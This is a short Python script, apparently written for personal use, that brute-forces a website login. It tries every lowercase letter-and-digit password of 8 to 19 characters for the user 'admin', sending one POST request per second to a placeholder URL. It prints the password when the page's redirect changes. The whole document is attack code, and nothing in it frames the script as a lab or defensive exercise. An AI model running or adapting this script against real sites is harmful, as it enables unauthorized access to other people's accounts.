import requests
import time
import string
import itertools

chars = string.ascii_lowercase + string.digits
password_founeded=False

#guess passwrod logic
for i in range(8, 20):
    for guess in itertools.product(chars, repeat=i):
        guess = ''.join(guess)

        #wait for 1s before evrey request
        time.sleep(1)

        #send post request username and password
        login = requests.post("{url}",
                              {"username": "admin", "password": guess})
        if login.url != "{redirected url}":
            print("password is : {0}".format(guess))
            password_founeded=True
            break
        else:
            print(guess)

    if password_founeded==True:
        break
